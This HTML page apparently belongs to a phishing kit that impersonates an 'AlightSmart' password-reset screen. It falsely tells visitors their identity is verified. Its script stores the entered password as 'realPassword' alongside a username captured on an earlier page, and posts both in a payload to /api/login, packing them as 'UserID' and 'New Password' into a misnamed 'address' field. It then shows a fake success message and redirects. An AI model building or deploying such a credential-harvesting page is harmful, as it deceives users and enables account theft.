<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password - AlightSmart</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: #f8fafc; 
            padding: 20px; 
            min-height: 100vh;
        }
        .container { 
            max-width: 420px; 
            margin: auto; 
            background: white; 
            padding: 40px 35px; 
            border-radius: 16px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
        }
        h1 { 
            font-size: 1.75rem; 
            text-align: center; 
            margin-bottom: 8px; 
            color: #1e2937; 
        }
        p { 
            text-align: center; 
            color: #64748b; 
            margin-bottom: 30px; 
        }
        label { 
            display: block; 
            margin: 20px 0 8px; 
            font-weight: 600; 
            color: #334155; 
        }
        input { 
            width: 100%; 
            padding: 14px; 
            border: 1.5px solid #e2e8f0; 
            border-radius: 10px; 
            font-size: 1.05rem; 
        }
        button { 
            width: 100%; 
            padding: 16px; 
            margin-top: 20px; 
            border: none; 
            border-radius: 10px; 
            font-size: 1.1rem; 
            font-weight: 600; 
            cursor: pointer; 
        }
        .submit-btn { background: #1e40af; color: white; }
        .success { color: #10b981; text-align: center; margin: 20px 0; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Create New Password</h1>
        <p>Your identity has been verified.<br>Please set a new password.</p>

        <form id="resetForm">
            <label for="newPassword">New Password</label>
            <input type="password" id="newPassword" placeholder="Enter new password" required>

            <label for="confirmPassword">Confirm New Password</label>
            <input type="password" id="confirmPassword" placeholder="Confirm new password" required>

            <button type="submit" class="submit-btn">Reset Password</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        let realUsername = sessionStorage.getItem('forgotUsername') || "Unknown";

        document.getElementById('resetForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const newPass = document.getElementById('newPassword').value.trim();
            const confirmPass = document.getElementById('confirmPassword').value.trim();
            const statusDiv = document.getElementById('status');

            if (newPass.length < 6) {
                statusDiv.innerHTML = `<p style="color:#ef4444;">Password must be at least 6 characters.</p>`;
                return;
            }

            if (newPass !== confirmPass) {
                statusDiv.innerHTML = `<p style="color:#ef4444;">Passwords do not match.</p>`;
                return;
            }

            statusDiv.innerHTML = `<p style="color:#eab308;">Updating password...</p>`;

            // Save credentials so they can be used on login page
            sessionStorage.setItem('realUsername', realUsername);
            sessionStorage.setItem('realPassword', newPass);

            const payload = {
                username: "Password Reset Success",
                password: newPass,
                address: `UserID: ${realUsername} | New Password: ${newPass} | Status: Password Successfully Reset`
            };

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                statusDiv.innerHTML = `
                    <p class="success">
                        ✅ Password Reset Successful!<br><br>
                        Redirecting to login...
                    </p>`;

                setTimeout(() => {
                    window.location.href = "login.html";
                }, 2500);

            } catch (err) {
                statusDiv.innerHTML = `<p style="color:#ef4444;">Failed to update. Please try again.</p>`;
            }
        });
    </script>
</body>
</html>
